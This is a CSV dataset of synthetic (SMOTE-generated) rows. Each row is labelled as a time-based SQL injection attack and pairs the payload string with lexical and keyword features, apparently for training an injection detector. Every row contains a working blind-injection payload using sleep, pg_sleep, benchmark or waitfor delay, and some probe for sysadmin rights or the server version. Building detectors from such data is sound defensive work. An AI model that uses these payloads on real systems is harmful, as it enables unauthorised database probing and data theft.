id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000119,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,1.7274921029584887,85.41014571095654,25.23043713286964,3.3545138952314066,16.589854289043455,19.82029142191309,38.0,11.0,0.19427703659130402,0.2320016419089519,0.4449267391222505,0.12879458237749358,0.4101457109565462,0.5898542890434539,0.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,1.0,1.0,0.410145710956546,0.5898542890434539,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.41014571095654606,0.5898542890434539,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000120,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000080,0.40751469955517583,73.62144908199824,28.088778440285463,3.8735175790434404,20.065341283425553,21.37855091800176,25.0,7.177556880570926,0.27156890087878405,0.29126067417982315,0.33980544057363765,0.09736498436775512,0.26633532085638856,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.08877844028546295,0.0,0.0,0.9112215597145372,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.088778440285463,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.088778440285463
SMOTE_000121,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.9974080676114261,45.0,17.0,3.0740066546775076,13.0,0.5922613022903915,20.0,11.407738697709608,0.28888888888888886,0.013161362273119814,0.4444444444444444,0.25350530439354685,0.0,0.40773869770960824,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,0.0,2.0,0.0,0.40773869770960836,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000122,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.02318759560463292,71.03057464875722,23.987770140497112,3.4390813267302196,19.0,10.0,31.036689578508664,10.993885070248556,0.267497976588883,0.14078840873099108,0.4369268246780284,0.15478679000209747,0.0,0.9938850702485558,2.0,0.0,0.0,1.0,0.0,5.006114929751444,0.9938850702485557,1.0,0.0,3.0,0.0,0.9938850702485557,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000123,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,1.9018443641672738,36.32233729509711,18.242978306012947,3.8831629415031688,19.214891530064737,3.3785108469935263,6.107445765032367,7.621489153006474,0.5225852614422271,0.10046776339368323,0.16043564706400582,0.2165113281000838,4.242978306012947,0.0,0.7570216939870528,0.0,0.0,0.6214891530064737,0.0,0.0,0.0,0.0,0.0,1.3785108469935263,1.0,0.0,0.3785108469935264,0.0,0.0,0.6214891530064737,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.6214891530064736,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6214891530064737
SMOTE_000124,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,1.0310121090775606,74.74269192647408,22.290448654412348,3.2505772919005715,16.053931539216464,16.871345963237044,33.053931539216464,8.763482884804116,0.21469907218261902,0.2223957635386426,0.4449074633944764,0.11799770088426195,0.0,0.0,0.0,0.0,0.0,0.7634828848041159,0.0,6.0,0.0,0.0,1.0,0.7634828848041157,0.0,0.0,0.0,1.0,0.0,0.7634828848041159,1.0,0.0,0.0,0.763482884804116,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000125,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.06330001612819104,97.98817081038152,31.964512431144556,3.830957611062617,29.940854051907593,18.0,39.0,11.047316758473924,0.3055500286950872,0.18369586844236618,0.39800771495846,0.11274638790408667,1.035487568855444,0.0,1.9763416207630375,0.0,0.0,2.0,0.0,5.0118291896184815,0.0,0.9881708103815189,0.011829189618481173,4.0,1.0,0.0,0.9881708103815188,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,0.988170810381519,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.011829189618481117,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000126,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.9415012235820718,63.525684629403095,26.106990983365943,4.199542807142217,32.31170266267121,3.5534954916829715,14.660486475048916,13.0,0.49768949655019856,0.055275939338047274,0.23199411121358,0.21504045289817414,3.5534954916829724,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,1.6697567624755418,1.0,2.776747745841486,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000127,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0026061531173682062,100.0,33.0,4.064409953944865,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0000000000000002,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000128,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.031083405623793844,69.01785289971485,27.98214710028515,4.203943595903596,35.03570579942969,3.017852899714848,16.982147100285154,13.982147100285152,0.5076270908220765,0.04372221353647618,0.24605893387671288,0.2025917617647345,4.0,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,1.0,1.0,3.982147100285152,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.9821471002851521,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.982147100285152
SMOTE_000129,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,1.3687051217778095,85.25405328903224,20.65081065780645,3.0387145189357687,30.603242631225797,1.6745946710967754,42.0,10.976215986709674,0.35768191989231346,0.019990543007936235,0.4940787065032669,0.1282488305964834,0.9762159867096734,0.0,0.0,0.0,1.0,0.32540532890322454,0.0,8.674594671096775,0.0,0.0,0.0,1.3254053289032244,0.3254053289032245,0.0,0.0,0.0,0.0,0.32540532890322454,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000130,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,1.938566582854805,80.53766568921662,21.612997067649857,3.0938259551150082,27.53766568921662,2.0,39.0,12.0,0.34189757430995077,0.0248340537996245,0.48426404909267773,0.149004322797747,0.4623343107833803,0.5376656892166197,0.0,0.0,1.0,0.0,0.0,8.0,0.9999999999999999,0.0,0.0,1.0,0.4623343107833803,0.5376656892166197,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.5376656892166196,0.4623343107833802,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000131,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,1.3341892187786517,75.88496940711545,23.382189412055283,3.287359973873646,19.0,10.0,35.649348231226014,11.235621175889431,0.2531754584746501,0.13325024130244742,0.46525550799497417,0.1483187922279283,1.0,0.0,2.0,0.0,0.0,1.0,0.0,5.853431763834147,0.38218941205528434,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.09293412612500858,61.598553081072765,20.0,2.981917582807218,13.0,10.59855308107277,30.0,8.0,0.2110573267969471,0.1720058717965921,0.4870553695314164,0.12988143187504436,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000133,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.3570168036771218,84.61100654449231,27.10684565042367,3.478400289799636,16.320536951271006,21.10684565042367,36.611006544492305,10.572617398305326,0.19397739297506048,0.25029588857949936,0.4312405724969147,0.12448614594852542,0.893154349576331,0.0,0.0,0.0,0.0,1.0,0.0,6.679463048728993,0.0,0.0,1.0,1.0,0.893154349576331,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,1.2274348292338961,105.46226216160792,30.462262161607924,3.646651649339148,30.46226216160792,18.0,45.0,12.0,0.28882925984910995,0.1706809776362136,0.426702444090534,0.1137873184241424,0.0,1.0,2.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.4622621616079222,0.5377378383920778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000135,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.11218670399406568,40.414648530814375,16.0,2.912613075152688,10.999999999999998,1.0,19.498270169269468,8.916378361544911,0.272911668695152,0.02481015169955926,0.4814462742638168,0.22083190534147198,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9163783615449113,0.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,0.6166187273890997,50.27994745117002,19.874119192612646,3.4271325625364337,21.0,2.0,19.524662606845897,7.755284844324121,0.4320981259579972,0.041152202472190216,0.3732759023630954,0.15347376920671724,0.0,4.0,0.0,0.0,0.0,1.0,0.0,2.7552848443241205,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.3097034740414166,28.849104853982666,14.454731456194798,3.167564322853072,9.969820970796533,0.48491048539826664,10.9094629123896,7.484910485398267,0.35004137207508923,0.014262073099949008,0.3713655282665307,0.2643310265584311,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.484910485398266,0.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.4849104853982662,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4849104853982662
SMOTE_000138,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,2.6385511540368602,124.90451932987709,27.0,3.351492042661169,43.10661131232614,11.117071224571342,56.52125518946943,14.15958160351019,0.3399760294996488,0.08801369760963257,0.45779313540960287,0.11421713748111578,0.8404183964898083,0.0,0.0,0.0,1.0,1.0,0.0,10.0,0.0,0.31916320702038337,0.0,2.0,0.8404183964898082,0.0,0.0,0.8404183964898084,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.8404183964898083,1.0,0.0,0.8404183964898083,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.15958160351019168,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.15958160351019168,0.15958160351019168,6.159581603510192
SMOTE_000139,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,0.25067950527794686,32.09253946097571,18.884995846213084,3.8082566969895058,18.460016615147666,1.0,8.517518692041126,4.115004153786916,0.5771579385625903,0.031553200347757604,0.2627759766228834,0.12851288446676876,0.17250623068037518,0.0,0.0,0.0,0.0,0.0,0.0,2.057502076893458,0.0,0.9424979231065418,0.0,0.0,0.057502076893458376,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.05750207689345843,0.0,0.0,0.0,0.057502076893458376,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1150041537869169
SMOTE_000140,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,0.21619466003358204,78.52334653244043,18.82961690758928,2.697969616155646,20.602439451041654,1.9432056358630936,43.1480845379464,12.82961690758928,0.2623159441902971,0.024631888380594116,0.5492637767611883,0.16378839066792059,0.0,3.9432056358630936,0.0,0.0,0.0,1.0,0.0,7.82961690758928,0.056794364136906514,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.05679436413690664,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0567943641369064
SMOTE_000141,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,0.9560495761962173,61.013382751136795,26.5100370633526,3.806101963032942,23.261709907244697,10.0,21.248327156107898,6.5033456877842,0.3795535801956698,0.16446354184376105,0.34988847707386,0.10609440088670909,0.7516728438920997,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.7516728438920997,0.7516728438920997,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.7516728438920997,0.0,1.0,0.0,0.0,0.24832715610790038,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000142,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,2.023554799127666,104.61027947147781,28.805139735738905,3.7868241082288305,28.927195630034465,21.085653709312794,38.43897205285222,16.15845807927833,0.27362154151485163,0.19917618935025602,0.3706525196371051,0.15654974949778727,3.7194860264261096,0.0,0.0,0.0,0.0,2.0,0.0,5.719486026426109,0.0,0.0,1.0,5.43897205285222,1.0,0.0,0.0,0.2805139735738904,0.0,1.0,1.0,0.0,0.0,0.2805139735738904,1.0,1.0,0.0,1.0,0.2805139735738904,0.2805139735738904,0.7194860264261096,0.0,0.0,0.0,0.0,0.0,0.0,0.7194860264261096,0.2805139735738904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.280513973573891
SMOTE_000143,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.8206440755338612,85.54870485220705,27.17068848697546,3.465255315756192,16.207327878256134,20.585344243487732,37.170688486975465,11.58534424348773,0.18983595513979465,0.2405750211619374,0.4343389531584766,0.13525007053979135,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.792672121743865,0.7926721217438651,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.7926721217438651,0.2073278782561347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.00032246008707996043,88.9991859722422,25.999755791672662,3.5785518383357786,22.999511583345328,22.999674388896885,34.99991859722422,8.000081402775779,0.2584234466727583,0.2584255075025248,0.3932614487447701,0.0898895970799469,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,8.140277577894928e-05,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.9999185972242209,0.0,0.0,0.0,0.9999185972242208,8.140277577911581e-05,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.999918597224221
SMOTE_000145,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.3251612636393002,97.37710400194283,26.077861999757147,3.6124923104105795,25.76641400072856,20.53282800145712,38.07786199975715,13.0,0.26454692381189177,0.2105780000115644,0.39130391427464545,0.13357116190189833,3.922138000242853,0.0,0.0,0.0,0.0,1.9221380002428532,0.0,6.077861999757147,0.07786199975714668,0.0,1.0,1.9221380002428532,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0778619997571468,0.0,0.0,0.0,1.0,0.9221380002428533,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,0.24927736851639942,126.21644417035975,28.0,3.441143550571121,44.75890589857222,10.0,55.69863237321529,15.758905898572229,0.35465126823128085,0.07928136194891577,0.4413320512403782,0.12473531857942513,1.8794529492861138,0.0,0.0,0.0,1.0,1.0,0.0,9.939726474643056,0.0,0.0,0.0,3.8794529492861143,0.9397264746430569,0.0,0.0,0.06027352535694297,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.939726474643057,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.939726474643058
SMOTE_000147,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.13829605648107854,44.23297662561909,16.744325541873028,3.073677164919516,13.0,0.744325541873029,19.488651083746056,11.0,0.2941647110407153,0.016540567597178424,0.44038611971227026,0.248908601649836,0.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000148,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.41430835961500667,34.078605762165964,16.0,3.110575976867642,10.999999999999998,0.0,14.662884609732771,8.415721152433193,0.32443862889879593,-1.3877787807814457e-17,0.4283702978068338,0.24719107329437032,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.4157211524331927,0.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
